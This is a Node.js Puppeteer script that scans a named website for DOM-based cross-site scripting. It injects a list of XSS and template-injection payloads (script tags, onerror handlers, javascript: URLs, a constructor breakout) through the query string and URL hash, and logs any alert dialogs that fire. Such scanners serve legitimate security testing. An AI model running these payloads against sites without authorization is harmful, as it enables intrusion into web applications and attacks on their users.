// 1. Using puppeteer-core to attach directly to your system's pre-installed Chromium
const puppeteer = require('puppeteer-core');

// Expanded payload list targeting classic HTML sinks, modern SPA frameworks, and attribute breakouts
const payloads = [
    'javascript:alert(1)',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"`><script>alert(1)</script>',
    '${alert(1)}',
    '{{constructor.constructor(\'alert(1)\')()}}' // Angular / Vue template injection breakout
];

// Target base URL (Ensure you have authorization or it is an in-scope asset)
const baseUrl = 'https://1w.run'; 

async function scanForDOMXSS() {
    console.log(`[+] Initializing Chromium Browser via Puppeteer...`);
    
    // Configured for your Ubuntu path at /usr/bin/chromium-browser
    const browser = await puppeteer.launch({ 
        executablePath: '/usr/bin/chromium-browser',
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });

    // We iterate through both 'query' (?) and 'hash' (#) input vectors
    const injectionTypes = ['query', 'hash'];

    for (let type of injectionTypes) {
        console.log(`\n[🚀 Starting Vector Campaign]: Testing via URL ${type.toUpperCase()}`);

        for (let payload of payloads) {
            const page = await browser.newPage();
            let xssDetected = false;

            // 1. Establish the Dialog Listener (Triggers if alert(), confirm(), or prompt() executes)
            page.on('dialog', async dialog => {
                if (dialog.message() || dialog.type() === 'alert') {
                    console.log(`\n[🚨 XSS DETECTED!]`);
                    console.log(`[🎯 Injection Strategy]: URL ${type.toUpperCase()}`);
                    console.log(`[🎯 Triggering Payload] : ${payload}`);
                    console.log(`[💬 Dialog Message]     : "${dialog.message()}"\n`);
                    xssDetected = true;
                    await dialog.dismiss();
                }
            });

            // 2. Establish a Console Listener (Logs browser notifications or blocked script contexts)
            page.on('console', msg => {
                if (msg.type() === 'error' && msg.text().toLowerCase().includes('alert')) {
                    console.log(`[⚠️ Console Warning]: Potential script execution blocked/logged: ${msg.text()}`);
                }
            });

            // 3. New Page Error Listener: Catches syntax errors or broken JS caused by your payload breakage
            page.on('pageerror', error => {
                // Ignore benign resource loading/analytics errors to keep output clean
                if (error.message.includes('alert') || error.message.includes('Unexpected token')) {
                    console.log(`[💥 JS Exception Found]: Code broke near payload context -> ${error.message}`);
                }
            });

            // 4. Construct the target URL dynamically based on the current attack vector
            let targetUrl = '';
            if (type === 'query') {
                targetUrl = `${baseUrl}?search=${encodeURIComponent(payload)}`;
            } else if (type === 'hash') {
                targetUrl = `${baseUrl}#${encodeURIComponent(payload)}`;
            }
            
            try {
                console.log(`[*] Testing parameter injection: ${targetUrl}`);
                
                // Navigate to the target page and wait for basic network traffic to stop
                await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 10000 });
                
                // Give the client-side JavaScript routers/sinks a brief window to execute the payload
                await new Promise(resolve => setTimeout(resolve, 1500));

            } catch (error) {
                console.log(`[-] Timeout or error loading page for payload: ${payload}`);
            } finally {
                await page.close();
            }
        }
    }

    console.log(`\n[+] Scan Campaign Finished.`);
    await browser.close();
}

scanForDOMXSS();
